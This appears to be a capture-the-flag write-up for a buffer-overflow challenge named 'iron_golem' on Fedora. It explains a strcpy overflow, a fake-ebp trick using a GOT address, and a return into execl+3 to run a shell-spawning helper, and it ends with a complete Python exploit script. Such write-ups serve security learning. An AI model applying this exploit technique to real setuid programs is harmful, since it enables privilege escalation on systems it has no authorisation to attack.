# Vulnerability
```
char buffer[256];
strcpy(buffer, argv[1]);
```
This program uses strcpy function that does not check boundary.

# Exploitation
In Fedora, I am not able to use library function because it starts with '\x00'.

This program gives me a hint that is a keyword "fake ebp".

I will give a static address that does not change when execute binary again to SFP.

Then, the ebp will filled with "fake ebp" and ret will be executed.

First, I found a static address to use as "fake ebp":
```
(gdb) x/4x 0x08049618
0x8049618 <_GLOBAL_OFFSET_TABLE_>:	0x0804954c	0x00000000	0x00000000	0x080482ee
(gdb) 
```
This address does not changed when I executed many times, so I will use this address as fake ebp.

In 0x0804954c:
```
(gdb) x/4x 0x0804954c
0x804954c <_DYNAMIC>:	0x00000001	0x00000024	0x0000000c	0x080482c0
(gdb) 
```
The value is 1 and end with '\x00'.

If I give this address to fake ebp and filled ret address with execl, the execl will do prolog:
```assembly
push ebp
mov esp, ebp
```
So I will fill ret address with execl+3:
```
Dump of assembler code for function execl:
0x007a5720 <execl+0>:	push   %ebp
0x007a5721 <execl+1>:	mov    %esp,%ebp
0x007a5723 <execl+3>:	lea    0x10(%ebp),%ecx
```
Then prolog will be skipped and execl will take parameter with fake ebp that I found before(GOT address).

The GOT address's value is 1, so I made a simple c code which executes shell and named it as '\x01'.

The payload will be:
```
---------------------------------------------------------------------------
| A*256(buffer) | A*8(dummy) | 0x08049610(fake ebp) | 0x007a5723(execl+3) |
---------------------------------------------------------------------------
```
The reason why I give fake ebp with [GOT address -8] is because execl or other function find parameter with +8, +12, +16, etc..

execl will find parameter with [fake ebp+8](GOT address) and will execute '\x01' named program successfully.

# Payload
```python
import os

filename = "/home/gate/iron_golem"

payload = ""
payload += "A"*256
payload += "A"*8 # dummy
payload += "\x10\x96\x04\x08" # fake ebp
payload += "\x23\x57\x7a" # execl+3

os.execv(filename, [filename, payload])
```
